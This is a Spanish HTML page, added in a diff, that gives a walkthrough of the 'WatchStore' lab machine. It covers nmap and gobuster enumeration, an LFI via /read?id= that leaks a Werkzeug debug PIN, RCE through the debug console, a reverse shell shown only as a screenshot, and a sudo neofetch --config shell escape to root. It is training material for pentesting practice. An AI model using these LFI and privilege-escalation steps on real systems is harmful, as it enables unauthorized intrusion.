@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Máquina 1 - Writeup</title>
+    <link rel="stylesheet" href="../../styles.css" />
+</head>
+<body>
+    <header>
+        <h1>WatchStore</h1>
+        <nav id="main-nav">
+            <a href="../../writeups.html" class="nav-link">← Volver atrás</a>
+        </nav>
+    </header>
+
+    <main>
+        <h2>Descripción</h2>
+        <p>Nombre: WatchStore</p>
+        <p>Fecha de creación 22/06/2025</p>
+        <p>MD5: 3775afe31b9a996676c2662afe9f2f2a</p>
+
+        <h2>Resumen</h2>
+        <p>En este writeup vamos a ver la explotación de esta máquina WatchStore, 
+            donde se escanearán los puertos vulnerables, se realizará una enumeración web,
+            también se explotarán vulnerabilidades como la inclusión de archivos local o (LFI), ejecución remota de código o (RCE)
+            y escalada de privilegios por medio de la explotación de ejecutables binarios vulnerables.</p>
+
+        <h2>Writeup</h2>
+        <ol>
+            <li>
+                <strong>Reconocimiento</strong><br />
+                Primero vamos a hacer un ping a la máquina para comprobar que podemos "verla" en la red:<br />
+                <code>ping -c 1 192.168.56.101</code><br />
+                Resultado:<br />
+                <pre>
+PING 10.0.2.15 (192.168.56.101) 56(84) bytes of data.
+64 bytes from 192.168.56.101: icmp_seq=1 ttl=64 time=0.042 ms
+
+--- 192.168.56.101 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 0.042/0.042/0.042/0.000 ms
+                </pre>
+            </li>
+
+            <li>
+                <strong>Enumeración</strong><br />
+                Escaneo de puertos típicos con nmap:<br />
+                <code>sudo nmap -T4 -Pn -p22,80,443,8080,3306,8000 192.168.56.101</code><br />
+                Resultado:<br />
+                <img src="escaneo_puertos.png" alt="Escaneo de puertos" style="max-width: 100%; height: auto;" />
+
+                Como hay un servicio web corriendo por el puerto 8080, usamos gobuster para buscar directorios ocultos:<br />
+                <code>gobuster dir -u http://watchstore.thl:8080/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20 -a "Mozilla/5.0"</code><br />
+                Algunos resultados:<br />
+                <img src="escaneo_gobuster.png" alt="Escaneo de subdominios" style="max-width: 100%; height: auto;" />
+            </li>
+
+            <li>
+                <strong>Explotación</strong><br />
+                Si accedemos al /read, podemos comprobar que pide un id al que hacerle el read, vamos a pasarle algo de ejemplo para comprobar si funciona:<br />
+                <code>http://watchstore.thl:8080/read?id=1</code><br />
+                Nos reporta lo siguiente:<br />
+                <img src="read.png" alt="read" style="max-width: 100%; height: auto;" />
+                Ya sabemos que puede leer archivos, vamos a probar con algo del propio directorio donde se encuentra el /read:<br />
+                <code>http://watchstore.thl:8080/read?id=static/css/style.css</code><br />
+                Vemos que nos devuelve el css.<br />
+
+                Si leemos el archivo de read, nos encontramos con un path a un archivo<br />
+                <code>/home/relox/watchstore/app.py</code><br />
+                donde se encuentra el código de la web, vamos a hacerle un read a este código de python:<br />
+                <code>http://watchstore.thl:8080/read?id=/home/relox/watchstore/app.py</code><br />
+                <img src="app_py.png" alt="app_py" style="max-width: 100%; height: auto;" />
+
+                Vemos que accedemos al archivo de python y ya de primeras hay una linea interesante:<br />
+                os.environ['WERKZEUG_DEBUG_PIN'] = '612-791-734'<br />
+                Aquí tenemos el código de la consola que vimos antes como directorio "/console", asi que vamos a acceder a esta y
+                vemos que podemos ejecutar código en python asi que vamos a pedirle que nos devuelva un ls para ver si funciona:<br />
+                <img src="ls.png" alt="ls" style="max-width: 100%; height: auto;" /><br />
+
+                Hacemos un ls del directorio padre del actual y vemos un archivo user.txt al hacerle el read, nos encontramos con la primera flag (la usuario).<br />
+                <img src="ls_padre.png" alt="ls_padre" style="max-width: 100%; height: auto;" /><br />
+
+                Ya que sabemos que podemos hacer varias cosas con python ya que usa el "os." vamos a lanzar una reverse shell hacia nuesta máquina atacante:<br />
+                <img src="reverse_shell.png" alt="reverse_shell" style="max-width: 100%; height: auto;" /><br />
+
+                Y pum! recibimos la reverse shell y tenemos acceso al usuario "relox".<br />
+                (Aqui podriamos hacer lo de leer la flag del usuario de user.txt)<br />
+            </li>
+        </ol>
+
+        <h2>Escalada de privilegios</h2>
+        <p>Ahora, vamos a ver si podemos escalar privilegios. Para ello, usamos</p>
+        <code>sudo -l</code><br />
+        <p>Vemos que podemos ejecutar como root el binario:<br /> /usr/bin/neofetch</p>
+        <p>Si hacemos una búsqueda en GTFOBins, vemos que podemos hacer lo siguiente para escalar privilegios con este binario:</p>
+        <img src="gtfobins.png" alt="gtfobins" style="max-width: 100%; height: auto;" /><br />
+
+        <p>Primero creamos un archivo temporal con el comando para lanzar una shell:</p>
+        <code>
+            TF=$(mktemp)<br />
+            echo 'exec /bin/sh' > $TF
+        </code><br />
+
+        <p>Ejecutamos neofetch usando ese archivo como configuración:</p>
+        <code>sudo /usr/bin/neofetch --config $TF</code><br />
+        <img src="escalada_privilegios.png" alt="escalada_privilegios" style="max-width: 100%; height: auto;" />
+        
+        <p><strong>Y... BOOM!!!</strong></p>
+<p><strong>SOMOS ROOT!!!</strong></p>
+
+<p>Por último, si accedemos al directorio <code>/root</code> y hacemos un <code>cat root.txt</code>, veremos la flag root.txt</p>
+
+        <h2>Conclusiones</h2>
+        <p>En este ejercicio de explotación de la máquina WatchStore, pudimos aplicar técnicas fundamentales de reconocimiento y enumeración para identificar los servicios activos y vulnerabilidades presentes.</p><br />
+        <p>La combinación de escaneo de puertos, enumeración web y la explotación de vulnerabilidades como LFI y ejecución remota de código (RCE) nos permitió obtener acceso inicial a la máquina.</p><br />
+        <p>Además, la escalada de privilegios mediante un binario con permisos especiales (neofetch) mostró la importancia de revisar las configuraciones de sudo y cómo vulnerabilidades en ejecutables comunes pueden comprometer la seguridad del sistema.</p><br />
+        <p>Este writeup refuerza la necesidad de un enfoque metódico en pentesting, el conocimiento de herramientas y la creatividad para encontrar vectores de ataque que, a simple vista, podrían pasar desapercibidos.</p>
+    </main>
+
+    <footer>
+        <p>© 2025 WatchStore Writeup. Diseñado y desarrollado por Y3i$i.</p>
+    </footer>
+
+    <script src="../script.js"></script>
+</body>
+</html>
